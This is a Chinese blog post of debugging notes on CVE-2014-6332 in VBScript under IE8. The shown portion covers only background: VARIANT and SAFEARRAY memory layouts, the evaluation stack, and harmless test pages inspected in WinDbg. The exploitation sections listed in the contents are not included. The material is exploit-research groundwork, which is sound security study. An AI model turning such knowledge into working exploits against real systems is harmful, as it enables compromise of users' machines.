
<!DOCTYPE html>
<html lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <title>CVE-2014-6332 调试笔记 | Lazymind</title>
  
    
      <link rel="stylesheet" href="/css/normalize.css">
    
      <link rel="stylesheet" href="/css/base.css">
    
      <link rel="stylesheet" href="/css/aside.css">
    
      <link rel="stylesheet" href="/css/blockquote.css">
    
      <link rel="stylesheet" href="/css/permalink.css">
    
      <link rel="stylesheet" href="/css/postscript.css">
    
      <link rel="stylesheet" href="/css/highlight/index.css">
    
  
</head>
<body>
  <div class="page">
    <nav id="menu-outer">
      <div id="menu-inner">
        
          <a href="/">Home</a>
        
          <a href="/leetcode/">Leetcode</a>
        
          <a href="/about/">About</a>
        
      </div>
    </nav>

    <div id="content-outer">
      <div id="content-inner">
        <article id="post" itemscope itemtype="http://schema.org/Article">
  <img itemprop="image" hidden src="/favicon.ico">
  <link itemprop="mainEntityOfPage" href="https://lazymind.me/2019/06/cve-2014-6332/">
  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="CVE-2014-6332 调试笔记">
  </span>
  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Conan">
    <meta itemprop="description" content="The quieter you are the more you are able to hear.">
    <meta itemprop="image" content="/favicon.ico">
  </span>
  <header>
  <h1 itemprop="headline name">CVE-2014-6332 调试笔记</h1>
  <p>Written on <time itemprop="dateCreated datePublished dateModified" datetime="2019-06-26T21:00:00.000Z">2019-06-26</time></p>
  </header>
  <div class="page-toc">
    <details class="toc">
      <summary class="toc-accordion">
        Table of Contents
      </summary>
        
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#调试环境"><span class="toc-number">1.</span> <span class="toc-text">调试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景知识"><span class="toc-number">2.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-vbscript-基础语法"><span class="toc-number">2.1.</span> <span class="toc-text">1. vbscript 基础语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-常用调试辅助函数"><span class="toc-number">2.2.</span> <span class="toc-text">2. 常用调试辅助函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-vbscript-变量"><span class="toc-number">2.3.</span> <span class="toc-text">3. vbscript 变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-vbscript-数组"><span class="toc-number">2.4.</span> <span class="toc-text">4. vbscript 数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-vbscript-求值栈"><span class="toc-number">2.5.</span> <span class="toc-text">5. vbscript 求值栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SafeMode-GodMode"><span class="toc-number">2.6.</span> <span class="toc-text">6. SafeMode(GodMode)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因分析"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞成因分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用分析"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内存布局"><span class="toc-number">3.2.1.</span> <span class="toc-text">内存布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取-CScriptEntryPoint对象指针"><span class="toc-number">3.2.2.</span> <span class="toc-text">获取 CScriptEntryPoint对象指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实现内存地址任意读"><span class="toc-number">3.2.3.</span> <span class="toc-text">实现内存地址任意读</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
        
      </details>
  </div>
  <div itemprop="articleBody">
    <h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>操作系统: Windows 7 Service Pack 1 32 位</p>
<p>浏览器: IE 8.0.7601.17514</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="1-vbscript-基础语法"><a href="#1-vbscript-基础语法" class="headerlink" title="1. vbscript 基础语法"></a>1. vbscript 基础语法</h3><p>vbscript 中定义一维数组语法 <code>dim array(9)</code> ,表示定义了一个包含10个元素的数组，下标从0开始，和其它语言唯一的区别是元素个数是 n + 1个。</p>
<p>多维数组： <code>dim array(2, 3)</code>, 表示定义了一个3行4列的二维数组。也可以不指明元素个数： <code>dim array()</code>。</p>
<p>使用关键字 <code>redim</code> 可以修改已定义的数组大小：<code>redim array(4)</code> 。但是在改变数组大小时，数组的数据可能会被破坏，需要加上关键字 <code>preserve</code>： <code>redim preserve array(10)</code>。此时原数组的数据不会破坏。</p>
<h3 id="2-常用调试辅助函数"><a href="#2-常用调试辅助函数" class="headerlink" title="2. 常用调试辅助函数"></a>2. 常用调试辅助函数</h3><p>在调试vbscript脚本时，一般会使用一些辅助函数用于方便调试定位变量地址，先来看下<code>IsEmpty</code>函数，该函数对应<code>vbscript.dll</code>模块中的<code>VbsIsEmpty</code>函数：</p>
<p><img src="/media/cve-2014-6332/VbsIsEmpty.png" alt="VbsIsEmpty"></p>
<p>在<code>VbsIsEmpty</code>函数中，实际调用的是<code>GetVarType</code>对第三个参数的进行类型判别，而第三个参数对应的即是 vbscript 语句中 <code>IsEmpty</code> 对应的参数。这样便可在调试时很容易知道我们需要的变量所在的内存地址。在 vbscript调试中会经常用到这个函数断点，同样的还有<code>VbsIsObject</code>,<code>VbsIsNull</code>等。</p>
<p>常见vbscript语句与对应的实现函数关系:</p>
<table>
<thead>
<tr>
<th align="center">vbscript 语句</th>
<th align="center">Native 实现函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>redim array(10)</code></td>
<td align="center"><code>vbscript!MakeArray</code></td>
</tr>
<tr>
<td align="center"><code>redim preserve array(10)</code></td>
<td align="center"><code>vbscript!RedimPreserveArray</code></td>
</tr>
<tr>
<td align="center"><code>a = 1</code></td>
<td align="center"><code>vbscript!AssignVar</code></td>
</tr>
<tr>
<td align="center"><code>IsEmpty</code></td>
<td align="center"><code>vbscript!VbsIsEmpty</code></td>
</tr>
<tr>
<td align="center"><code>Msgbox &quot;hello&quot;</code></td>
<td align="center"><code>vbscript!VbsMsgbox</code></td>
</tr>
<tr>
<td align="center"><code>IsObject(a)</code></td>
<td align="center"><code>vbscript!VbsIsObject</code></td>
</tr>
</tbody></table>
<h3 id="3-vbscript-变量"><a href="#3-vbscript-变量" class="headerlink" title="3. vbscript 变量"></a>3. vbscript 变量</h3><p>vbscript中变量由<a href="https://docs.microsoft.com/zh-cn/windows/desktop/api/oaidl/ns-oaidl-tagvariant" target="_blank" rel="noopener"><code>VARIANT</code></a>结构体定义，内存占用大小为<code>0x10</code>，其结构如下(简化了union部分):</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagVARIANT</span> &#123;</span></span><br><span class="line">    VARTYPE varType;       +<span class="number">0x0</span>: word 变量的类型值</span><br><span class="line">    WORD    wReserved1;</span><br><span class="line">    WORD    wReserved2;</span><br><span class="line">    WORD    wReserved3;</span><br><span class="line">    DWORD   dataLow;       +<span class="number">0x8</span>: dword 存放实际的元素数据</span><br><span class="line">    DWORD   dataHigh;      +<span class="number">0xc</span>: dword 同上，对于哪些字节表示实际数据，需要参考varType的值，以确定数据的大小</span><br><span class="line">&#125; VARIANT;</span><br></pre></td></tr></table></figure>

<p>其中<code>varType</code>字段表示变量的类型，由 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wtypes/ne-wtypes-varenum" target="_blank" rel="noopener"><code>VARENUM</code></a> 枚举类型指定，对应的头文件为<code>wtypes.h</code>,常见的类型值如下:</p>
<p>常用版:</p>
<table>
<thead>
<tr>
<th align="center">Constant</th>
<th align="center">Value</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">vbEmpty</td>
<td align="center">0</td>
<td align="center">未初始化（Empty）</td>
</tr>
<tr>
<td align="center">vbNull</td>
<td align="center">1</td>
<td align="center">无效数据（NULL）</td>
</tr>
<tr>
<td align="center">vbInterger</td>
<td align="center">2</td>
<td align="center">整型（Interger）</td>
</tr>
<tr>
<td align="center">vbLong</td>
<td align="center">3</td>
<td align="center">长整型（Long Interger）</td>
</tr>
<tr>
<td align="center">vbDouble</td>
<td align="center">5</td>
<td align="center">双精度类型</td>
</tr>
<tr>
<td align="center">vbString</td>
<td align="center">8</td>
<td align="center">字符串类型</td>
</tr>
<tr>
<td align="center">VbClass</td>
<td align="center">9</td>
<td align="center">类对象引用</td>
</tr>
<tr>
<td align="center">vbVariant</td>
<td align="center">0xc</td>
<td align="center">Variant（仅对数组有效）</td>
</tr>
<tr>
<td align="center">vbArray</td>
<td align="center">0x2000</td>
<td align="center">数组类型</td>
</tr>
</tbody></table>
<p>官方版:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> VARENUM &#123;</span><br><span class="line">    VT_EMPTY            = <span class="number">0</span>,</span><br><span class="line">    VT_NULL             = <span class="number">1</span>,</span><br><span class="line">    VT_I2               = <span class="number">2</span>,</span><br><span class="line">    VT_I4               = <span class="number">3</span>,</span><br><span class="line">    VT_R4               = <span class="number">4</span>,</span><br><span class="line">    VT_R8               = <span class="number">5</span>,</span><br><span class="line">    VT_CY               = <span class="number">6</span>,</span><br><span class="line">    VT_DATE             = <span class="number">7</span>,</span><br><span class="line">    VT_BSTR             = <span class="number">8</span>,</span><br><span class="line">    VT_DISPATCH         = <span class="number">9</span>,</span><br><span class="line">    VT_ERROR            = <span class="number">0x0A</span>,</span><br><span class="line">    VT_BOOL             = <span class="number">0x0B</span>,</span><br><span class="line">    VT_VARIANT          = <span class="number">0x0C</span>,</span><br><span class="line">    VT_UNKNOWN          = <span class="number">0x0D</span>,</span><br><span class="line">    VT_DECIMAL          = <span class="number">14</span>,</span><br><span class="line">    VT_I1               = <span class="number">16</span>,</span><br><span class="line">    VT_UI1              = <span class="number">17</span>,</span><br><span class="line">    VT_UI2              = <span class="number">18</span>,</span><br><span class="line">    VT_UI4              = <span class="number">19</span>,</span><br><span class="line">    VT_I8               = <span class="number">20</span>,</span><br><span class="line">    VT_UI8              = <span class="number">21</span>,</span><br><span class="line">    VT_INT              = <span class="number">22</span>,</span><br><span class="line">    VT_UINT             = <span class="number">23</span>,</span><br><span class="line">    VT_VOID             = <span class="number">24</span>,</span><br><span class="line">    VT_HRESULT          = <span class="number">25</span>,</span><br><span class="line">    VT_PTR              = <span class="number">26</span>,</span><br><span class="line">    VT_SAFEARRAY        = <span class="number">27</span>,</span><br><span class="line">    VT_CARRAY           = <span class="number">28</span>,</span><br><span class="line">    VT_USERDEFINED      = <span class="number">29</span>,</span><br><span class="line">    VT_LPSTR            = <span class="number">30</span>,</span><br><span class="line">    VT_LPWSTR           = <span class="number">31</span>,</span><br><span class="line">    VT_RECORD           = <span class="number">36</span>,</span><br><span class="line">    VT_INT_PTR          = <span class="number">37</span>,</span><br><span class="line">    VT_UINT_PTR         = <span class="number">38</span>,</span><br><span class="line">    VT_FILETIME         = <span class="number">64</span>,</span><br><span class="line">    VT_BLOB             = <span class="number">65</span>,</span><br><span class="line">    VT_STREAM           = <span class="number">66</span>,</span><br><span class="line">    VT_STORAGE          = <span class="number">67</span>,</span><br><span class="line">    VT_STREAMED_OBJECT  = <span class="number">68</span>,</span><br><span class="line">    VT_STORED_OBJECT    = <span class="number">69</span>,</span><br><span class="line">    VT_BLOB_OBJECT      = <span class="number">70</span>,</span><br><span class="line">    VT_CF               = <span class="number">0x47</span>,</span><br><span class="line">    VT_CLSID            = <span class="number">0x48</span>,</span><br><span class="line">    VT_VERSIONED_STREAM = <span class="number">0x49</span>,</span><br><span class="line">    VT_BSTR_BLOB        = <span class="number">0xFFF</span>,</span><br><span class="line">    VT_VECTOR           = <span class="number">0x1000</span>,</span><br><span class="line">    VT_ARRAY            = <span class="number">0x2000</span>,</span><br><span class="line">    VT_BYREF            = <span class="number">0x4000</span>,</span><br><span class="line">    VT_RESERVED         = <span class="number">0x8000</span>,</span><br><span class="line">    VT_ILLEGAL          = <span class="number">0xFFFF</span>,</span><br><span class="line">    VT_ILLEGALMASKED    = <span class="number">0xFFF</span>,</span><br><span class="line">    VT_TYPEMASK         = <span class="number">0xFFF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试如下poc:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    dim a</span><br><span class="line">    dim b</span><br><span class="line">    dim c</span><br><span class="line">    dim d</span><br><span class="line">    a = &amp;h1234</span><br><span class="line">    b = &amp;h87654321</span><br><span class="line">    c = 1.1234567890123456789</span><br><span class="line">    d = "hello"</span><br><span class="line">    IsEmpty(a)</span><br><span class="line">    IsEmpty(b)</span><br><span class="line">    IsEmpty(c)</span><br><span class="line">    IsEmpty(d)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:38:39.588 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  00000002 00000000 00001234 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:45:11.523 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  00000003 00000000 87654321 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:45:33.488 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  00000005 00000000 d3746f66 3ff1f9ad</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:45:48.838 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  0000004a 00000000 0060f838 00000000</span><br><span class="line">0:005&gt; dd 0060f838 l4</span><br><span class="line">0060f838  00000008 00000000 003ceb74 00000000</span><br><span class="line">0:005&gt; du 003ceb74</span><br><span class="line">003ceb74  &quot;hello&quot;</span><br><span class="line">0:005&gt; dt VARIANT 0060f838 vt wReserved1 wReserved2 wReserved3 bstrVal</span><br><span class="line">ole32!VARIANT</span><br><span class="line">   +0x000 vt         : 8</span><br><span class="line">   +0x002 wReserved1 : 0</span><br><span class="line">   +0x004 wReserved2 : 0</span><br><span class="line">   +0x006 wReserved3 : 0</span><br><span class="line">   +0x008 bstrVal    : 0x003ceb74  &quot;hello&quot;</span><br><span class="line">0:005&gt; dd 0x003ceb74 - 4 l4</span><br><span class="line">003ceb70  0000000a 00650068 006c006c 0000006f</span><br></pre></td></tr></table></figure>

<p>在字符串类型中，<code>VT_BSTR</code>指针的前4个字节实际上存的是字符串的长度(一个字符两个字节)。</p>
<h3 id="4-vbscript-数组"><a href="#4-vbscript-数组" class="headerlink" title="4. vbscript 数组"></a>4. vbscript 数组</h3><p>vbscript中数组由<code>SAFEARRAY</code>和<code>SAFEARRAYBOUND</code>结构体定义.</p>
<p><a href="https://docs.microsoft.com/en-us/windows/desktop/api/oaidl/ns-oaidl-safearray" target="_blank" rel="noopener"><code>SAFEARRAY</code></a>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSAFEARRAY</span> &#123;</span></span><br><span class="line">  USHORT         cDims;			<span class="comment">// 数组维数</span></span><br><span class="line">  USHORT         fFeatures;		<span class="comment">// 数组特性</span></span><br><span class="line">  ULONG          cbElements;	<span class="comment">// 每个元素大小</span></span><br><span class="line">  ULONG          cLocks;		<span class="comment">// 锁定计数</span></span><br><span class="line">  PVOID          pvData;		<span class="comment">// 实际数组数据指针</span></span><br><span class="line">  SAFEARRAYBOUND rgsabound[<span class="number">1</span>];   <span class="comment">// 数组下标相关信息</span></span><br><span class="line">&#125; SAFEARRAY;</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.microsoft.com/en-us/windows/desktop/api/oaidl/ns-oaidl-safearraybound" target="_blank" rel="noopener"><code>SAFEARRAYBOUND</code></a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSAFEARRAYBOUND</span> &#123;</span></span><br><span class="line">  ULONG cElements;					<span class="comment">// 该维数数组大小，即元素个数</span></span><br><span class="line">  LONG  lLbound;					<span class="comment">// 该维数数组索引的起始值</span></span><br><span class="line">&#125; SAFEARRAYBOUND, *LPSAFEARRAYBOUND;</span><br></pre></td></tr></table></figure>

<p>调试如下poc:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    dim a(2)</span><br><span class="line">    a(0) = &amp;h12345678</span><br><span class="line">    a(1) = &amp;h87654321</span><br><span class="line">    IsEmpty(a)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 19:18:30.865 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=68d8185c ebx=0241cfac ecx=68dda9d8 edx=0241cf24 esi=02079e44 edi=00000001</span><br><span class="line">eip=68d9c206 esp=0241ce40 ebp=0241ce50 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68d9c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0207a5e0  0000600c 00000000 0070fd08 004f9e50</span><br><span class="line">0:005&gt; dd 004f9e50 l8</span><br><span class="line">004f9e50  08920001 00000010 00000000 004d3c38</span><br><span class="line">004f9e60  00000003 00000000 43797355 8c000000</span><br><span class="line">0:005&gt; dt SAFEARRAY 004f9e50</span><br><span class="line">ole32!SAFEARRAY</span><br><span class="line">   +0x000 cDims            : 1</span><br><span class="line">   +0x002 fFeatures        : 0x892</span><br><span class="line">   +0x004 cbElements       : 0x10</span><br><span class="line">   +0x008 cLocks           : 0</span><br><span class="line">   +0x00c pvData           : 0x004d3c38</span><br><span class="line">   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND</span><br><span class="line">0:005&gt; dt SAFEARRAYBOUND 004f9e50 + 0x10</span><br><span class="line">ole32!SAFEARRAYBOUND</span><br><span class="line">   +0x000 cElements        : 3</span><br><span class="line">   +0x004 lLbound          : 0</span><br><span class="line">0:005&gt; dd 0x004d3c38 lc</span><br><span class="line">004d3c38  00000003 00000000 12345678 00000000</span><br><span class="line">004d3c48  00000003 00000000 87654321 00000000</span><br><span class="line">004d3c58  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>

<h3 id="5-vbscript-求值栈"><a href="#5-vbscript-求值栈" class="headerlink" title="5. vbscript 求值栈"></a>5. vbscript 求值栈</h3><p>在vbscript解释器中，像赋值或者求值等操作，都会用到一个栈来保存中间及临时结果，这个栈被称为求值栈，栈上的对象格式为<code>VARIANT</code>类型。如 <code>a=&amp;h12345678</code>,解释器会先将<code>&amp;h12345678</code>解析为<code>VARIANT</code>对象，然后放到求值栈中，然后调用<code>vbscript!AssignVar</code>函数进行复制操作，先取出求值栈中<code>0x12345678</code>的<code>VARIANT</code>对象，然后赋值给<code>a</code>。</p>
<p>调试如下poc:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    dim a</span><br><span class="line">    IsEmpty("AssignVar")</span><br><span class="line">    a = &amp;h87654321</span><br><span class="line">    IsEmpty(a)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

